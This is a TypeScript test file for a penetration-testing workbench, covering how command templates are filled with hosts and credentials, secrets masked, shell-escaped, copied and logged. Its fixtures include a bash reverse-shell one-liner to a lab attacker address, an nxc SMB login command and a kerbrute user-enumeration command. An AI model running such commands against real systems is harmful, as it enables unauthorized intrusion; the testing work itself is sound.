import { QueryClientProvider } from "@tanstack/react-query";
import { act, renderHook } from "@testing-library/react";
import { createElement, type ReactNode } from "react";
import { beforeEach, describe, expect, it, vi } from "vitest";
import type { FillInput } from "../../../engines/checklist";
import type { LibraryCommand } from "../../../engines/library/types";
import { logCommand } from "../../../features/capture/logCommand";
import { MASK } from "../../../features/credentials/MaskedSecret/MaskedSecret";
import { clipboardMode, createCommandCopy, ranOn, type Clipboard, type CommandLogEntry, type LogTarget } from "../../../features/commands/copyCommand";
import { commandText, fillLibraryCommand, joinCommands } from "../../../features/commands/filledCommand";
import { useCommandCopy, type CopyTo } from "../../../features/commands/useCommandCopy";
import { makeQueryClient } from "../../../lib/queryClient";
import type { Credential } from "../../../types/credentials";
import type { Engagement } from "../../../types/engagement";
import type { Host } from "../../../types/host";

vi.mock("../../../features/capture/logCommand", () => ({ logCommand: vi.fn() }));

// Counts the fills: the module's one fill goes through the engine's `fillForms`.
const fills = vi.hoisted(() => ({ n: 0 }));
vi.mock("../../../engines/checklist", async (orig) => {
  const real = await orig<typeof import("../../../engines/checklist")>();
  return {
    ...real,
    fillForms: (...args: Parameters<typeof real.fillForms>) => {
      fills.n++;
      return real.fillForms(...args);
    },
  };
});

const ENG: Engagement = {
  id: "e1", name: "Lab A", kind: "lab", client: null, subLabel: null, scopeCidrs: ["10.10.10.0/24"], domain: "corp.local",
  startsAt: null, endsAt: null, timeboxStart: null, timeboxMinutes: null, status: "active", createdAt: 1, updatedAt: 1,
  lastActivityAt: null, lastRanOn: null, msfHostId: null, timeboxPausedMs: 0, timeboxPausedAt: null,
};
const HOST: Host = {
  id: "h1", engagementId: "e1", name: "web01.corp.local", ip: "10.10.10.5", os: "linux", boardColumn: "information-gathering",
  boardManual: false, dualHomed: false, boardDerived: null, accessReviewedAt: null, adSet: null, adSetEffective: false,
  access: "none", createdAt: 1, updatedAt: 1,
};
const cred = (over: Partial<Credential>): Credential => ({
  id: "c1", engagementId: "e1", type: "password", username: "alice", domain: null, secret: "S3cret!", hashType: null,
  scope: "domain", localHostId: null, sourceHostId: null, source: null, notes: null, crackStatus: null, crackedFrom: null,
  fromSecretId: null, createdAt: 1, updatedAt: 1, ...over,
});
const input = (c: Credential | null = null): FillInput => ({
  host: HOST, engagement: ENG, hosts: [HOST], servicesByHost: new Map(), tunnels: [], attackerIp: "10.10.14.9", listenerPort: "4444",
  cred: c,
});
const command = (over: Partial<LibraryCommand>): LibraryCommand => ({
  id: "zz", title: "Zz", tool: "zz", template: "zz", os: "any", runFrom: "attacker", goals: [], source: "raven", ...over,
});
const LOGIN = command({ id: "login", title: "Log in", template: "nxc smb {TARGET_IP} -u '{USER}' -p '{PASS}'" });
const ON_TARGET = command({ id: "whoami", title: "Who am I", template: "whoami /all", runFrom: "target", os: "windows" });

/** A stand-in clipboard and log. */
function standIns() {
  const clipboard: Clipboard & { writes: [mode: string, text: string][] } = {
    writes: [],
    secret: vi.fn(async (t: string) => void clipboard.writes.push(["secret", t])),
    plain: vi.fn(async (t: string) => void clipboard.writes.push(["plain", t])),
  };
  const logged: CommandLogEntry[] = [];
  const log: LogTarget = { hostName: "web01.corp.local", attacker: "Kali (VM)", write: vi.fn(async (e: CommandLogEntry) => void logged.push(e)) };
  return { clipboard, log, logged, copier: createCommandCopy(clipboard) };
}

beforeEach(() => {
  fills.n = 0;
});

describe("a filled command", () => {
  it("fills once: shown, copied and typed come from one fill, and copying and logging fill nothing more", async () => {
    const { copier, log } = standIns();
    const cmd = fillLibraryCommand(LOGIN, input(cred({})));
    expect(fills.n).toBe(1);
    await copier.copy(cmd, { hostName: "web01", log });
    expect(fills.n).toBe(1);
  });

  it("masks secrets when shown and puts them in when copied and typed", () => {
    const cmd = fillLibraryCommand(LOGIN, input(cred({})));
    expect(cmd.shown).toBe(`nxc smb 10.10.10.5 -u 'alice' -p '${MASK}'`);
    expect(cmd.typed).toBe("nxc smb 10.10.10.5 -u 'alice' -p 'S3cret!'");
    expect(cmd.copied).toContain("S3cret!");
    expect(cmd.secret).toBe(true);
  });

  it("copies a command run from Kali shell-safe, and types it as written", () => {
    const cmd = fillLibraryCommand(LOGIN, input(cred({ secret: "it's" })));
    expect(cmd.copied).toBe(`nxc smb 10.10.10.5 -u 'alice' -p 'it'\\''s'`);
    expect(cmd.typed).toBe("nxc smb 10.10.10.5 -u 'alice' -p 'it's'");
    expect(cmd.shown).not.toContain("it's");
  });

  it("leaves an unfilled secret unresolved, shown as its token", () => {
    const cmd = fillLibraryCommand(LOGIN, input(null));
    expect(cmd.unresolved).toEqual(["USER", "PASS"]);
    expect(cmd.shown).toBe("nxc smb 10.10.10.5 -u '{USER}' -p '{PASS}'");
    expect(cmd.tokens).toEqual(["{USER}", "{PASS}"]);
    expect(cmd.secret).toBe(false);
  });
});

describe("the clipboard mode", () => {
  it("copies a command carrying a secret as a secret", async () => {
    const { copier, clipboard } = standIns();
    await copier.copy(fillLibraryCommand(LOGIN, input(cred({}))), { hostName: null });
    expect(clipboard.writes).toEqual([["secret", `nxc smb 10.10.10.5 -u 'alice' -p 'S3cret!'`]]);
  });

  it("copies anything else as plain text, even when shell-escaping changed it", async () => {
    const { copier, clipboard } = standIns();
    const userOnly = command({ id: "u", template: "kerbrute userenum -d corp.local '{USER}'" });
    const cmd = fillLibraryCommand(userOnly, input(cred({ type: "hash", username: "o'neil", secret: "" })));
    expect(cmd.copied).not.toBe(cmd.typed);
    expect(clipboardMode(cmd)).toBe("plain");
    await copier.copy(cmd, { hostName: null });
    expect(clipboard.writes).toEqual([["plain", `kerbrute userenum -d corp.local 'o'\\''neil'`]]);
  });

  it("copies a command given as text as plain text", async () => {
    const { copier, clipboard } = standIns();
    await copier.copy(commandText({ id: "p", title: "Payload", text: "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1" }), { hostName: null });
    expect(clipboard.writes).toEqual([["plain", "bash -i >& /dev/tcp/10.10.14.9/4444 0>&1"]]);
  });
});

describe("the copy guard", () => {
  it("holds back a command with an unfilled token once, sending focus to its field or, for a secret, the credential chip", async () => {
    const { copier, clipboard } = standIns();
    const cmd = fillLibraryCommand(LOGIN, input(null));
    expect(await copier.copy(cmd, { hostName: "web01" })).toEqual({
      outcome: "guarded", key: "login|USER,PASS", hint: "{USER} not filled. Press ↵ again to copy anyway", focus: { token: "USER", cred: false },
    });
    expect(clipboard.writes).toEqual([]);
    const pass = commandText({ id: "p", title: "P", text: "-p {PASS}", unresolved: ["PASS"] });
    expect(await copier.copy(pass, { hostName: null })).toMatchObject({ focus: { token: "PASS", cred: true } });
  });

  it("copies anyway on the second try after a warning, and names the placeholders left", async () => {
    const { copier, clipboard } = standIns();
    const cmd = fillLibraryCommand(LOGIN, input(null));
    const warning = { warn: "Not allowed in the exam", warnKey: "banned" };
    expect(await copier.copy(cmd, { hostName: "web01", warning, repeatKey: "⌘↵ or Copy" })).toMatchObject({
      outcome: "guarded", hint: "{USER} not filled. Press ⌘↵ or Copy again to copy anyway",
    });
    expect(await copier.copy(cmd, { hostName: "web01", warning })).toMatchObject({
      outcome: "guarded", hint: "Not allowed in the exam. Press ↵ again to copy anyway", focus: null,
    });
    expect(clipboard.writes).toEqual([]);
    expect(await copier.copy(cmd, { hostName: "web01", warning })).toEqual({
      outcome: "copied", key: "login|USER,PASS", confirm: "Copied for web01. 2 placeholders left", tone: "warn", logged: false,
    });
    expect(clipboard.writes).toHaveLength(1);
  });

  it("holds back again for another warning, another command, or after a reset", async () => {
    const { copier, clipboard } = standIns();
    const cmd = commandText({ id: "a", title: "A", text: "a" });
    await copier.copy(cmd, { hostName: null, warning: { warn: "w", warnKey: "x" } });
    expect((await copier.copy(cmd, { hostName: null, warning: { warn: "w", warnKey: "y" } })).outcome).toBe("guarded");
    expect((await copier.copy(commandText({ id: "b", title: "B", text: "b" }), { hostName: null, warning: { warn: "w", warnKey: "y" } })).outcome).toBe("guarded");
    copier.reset();
    expect((await copier.copy(cmd, { hostName: null, warning: { warn: "w", warnKey: "y" } })).outcome).toBe("guarded");
    expect(clipboard.writes).toEqual([]);
  });

  it("guards several blocks as one command, copying each block's own text", async () => {
    const { copier, clipboard } = standIns();
    const as = { id: "transfer:http", unresolved: ["FILE"] };
    expect((await copier.copy(commandText({ id: "a", title: "A", text: "serve" }), { hostName: null, guardAs: as })).outcome).toBe("guarded");
    expect((await copier.copy(commandText({ id: "b", title: "B", text: "fetch" }), { hostName: null, guardAs: as })).outcome).toBe("copied");
    expect(clipboard.writes).toEqual([["plain", "fetch"]]);
  });
});

describe("logging", () => {
  it("logs a command run from the attacker as run on your machine, with the text as typed", async () => {
    const { copier, log, logged } = standIns();
    const r = await copier.copy(fillLibraryCommand(LOGIN, input(cred({ secret: "it's" }))), { hostName: "web01", log });
    expect(r).toMatchObject({ outcome: "copied", logged: true });
    expect(logged).toEqual([{ title: "Log in", command: "nxc smb 10.10.10.5 -u 'alice' -p 'it's'", ranOn: "Kali (VM)" }]);
  });

  it("logs a command run on the target as run on the host in view", async () => {
    const { copier, log, logged } = standIns();
    await copier.copy(fillLibraryCommand(ON_TARGET, input()), { hostName: "web01", log, logAs: { payloadId: "x", payloadValues: { LHOST: "1" } } });
    expect(logged).toEqual([{ title: "Who am I", command: "whoami /all", ranOn: "web01.corp.local", payloadId: "x", payloadValues: { LHOST: "1" } }]);
    expect(ranOn({ runFrom: "attacker" }, { hostName: "web01", attacker: "" })).toBe("");
  });

  it("logs nothing for a held-back copy, and nothing without a log target", async () => {
    const { copier, log, logged } = standIns();
    await copier.copy(fillLibraryCommand(LOGIN, input(null)), { hostName: "web01", log });
    expect(logged).toEqual([]);
    expect(await copier.copy(fillLibraryCommand(ON_TARGET, input()), { hostName: "web01" })).toMatchObject({ logged: false });
    expect(logged).toEqual([]);
  });

  it("confirms the copy, then runs afterCopy, then logs; a failed log rejects after the copy stands", async () => {
    const { copier, clipboard } = standIns();
    const order: string[] = [];
    const failing: LogTarget = { hostName: "web01", attacker: "Kali", write: async () => { order.push("log"); throw new Error("locked"); } };
    await expect(copier.copy(fillLibraryCommand(ON_TARGET, input()), {
      hostName: "web01", log: failing, onCopied: () => order.push("confirm"), afterCopy: async () => void order.push("after"),
    })).rejects.toThrow("locked");
    expect(order).toEqual(["confirm", "after", "log"]);
    expect(clipboard.writes).toHaveLength(1);
  });

  it("joins several commands into one, a line each, for one log entry", () => {
    const a = fillLibraryCommand(ON_TARGET, input());
    const b = commandText({ id: "b", title: "B", text: "dir {X}", unresolved: ["X"] });
    expect(joinCommands("t", "T", [a, b])).toMatchObject({ typed: "whoami /all\ndir {X}", unresolved: ["X"], runFrom: "target", secret: false });
  });
});

describe("useCommandCopy, the React adapter", () => {
  const wrapper = ({ children }: { children: ReactNode }) => createElement(QueryClientProvider, { client: makeQueryClient() }, children);
  const TO: CopyTo = { host: HOST, engagement: { id: "e1", hosts: [HOST], machines: ["Kali (VM)"] } };
  // jsdom has no clipboard: the system one, stood in.
  let board = "";
  beforeEach(() => {
    board = "";
    Object.defineProperty(navigator, "clipboard", {
      configurable: true,
      value: { writeText: async (t: string) => void (board = t), readText: async () => board },
    });
  });

  function setup(to: CopyTo = TO) {
    const focusToken = vi.fn();
    const focusCred = vi.fn();
    const onNote = vi.fn();
    const hook = renderHook(() => useCommandCopy({ to, focusToken, focusCred, onNote }), { wrapper });
    return { focusToken, focusCred, onNote, ...hook };
  }

  it("sends an unfilled USER or DOMAIN to its field, and PASS, HASH or CRED to the credential chip", async () => {
    const { result, focusToken, focusCred } = setup();
    for (const t of ["USER", "DOMAIN", "PASS", "HASH", "CRED"]) {
      await act(() => result.current.copy(commandText({ id: t, title: t, text: `{${t}}`, unresolved: [t] })));
    }
    expect(focusToken.mock.calls).toEqual([["USER"], ["DOMAIN"]]);
    expect(focusCred).toHaveBeenCalledTimes(3);
  });

  it("shows the hint, then the confirm for the host in view, for the command they belong to, and tells onNote", async () => {
    const { result, onNote } = setup();
    const cmd = fillLibraryCommand(ON_TARGET, input());
    const other = commandText({ id: "x", title: "X", text: "x" });
    expect(await act(() => result.current.copy(cmd, { warning: { warn: "Not allowed in the exam" } }))).toBe("guarded");
    expect(result.current.noteFor(cmd)).toBe("Not allowed in the exam. Press ↵ again to copy anyway");
    expect(result.current.noteFor(other)).toBeNull();
    expect(await act(() => result.current.copy(cmd, { warning: { warn: "Not allowed in the exam" } }))).toBe("copied");
    expect(result.current.hint).toBeNull();
    expect(result.current.confirm).toBe("Copied for web01");
    expect(onNote.mock.calls).toEqual([["Not allowed in the exam. Press ↵ again to copy anyway", "warn"], ["Copied for web01", "ok"]]);
    expect(await navigator.clipboard.readText()).toBe("whoami /all");
  });

  it("logs through the log mutation only when asked and only with a host and its engagement", async () => {
    const logged = vi.mocked(logCommand);
    logged.mockReset();
    logged.mockResolvedValue({} as never);
    const cmd = fillLibraryCommand(ON_TARGET, input());
    const withHost = setup();
    expect(withHost.result.current.canLog).toBe(true);
    await act(() => withHost.result.current.copy(cmd));
    expect(logged).not.toHaveBeenCalled();
    await act(() => withHost.result.current.copy(cmd, { log: true }));
    expect(logged).toHaveBeenCalledWith(expect.anything(), {
      engagementId: "e1", host: HOST, hosts: [HOST], title: "Who am I", command: "whoami /all", ranOn: "web01.corp.local",
    });
    const noEngagement = setup({ host: HOST, engagement: null });
    expect(noEngagement.result.current.canLog).toBe(false);
    expect(await act(() => noEngagement.result.current.copy(cmd, { log: true }))).toBe("copied");
    expect(logged).toHaveBeenCalledTimes(1);
  });
});
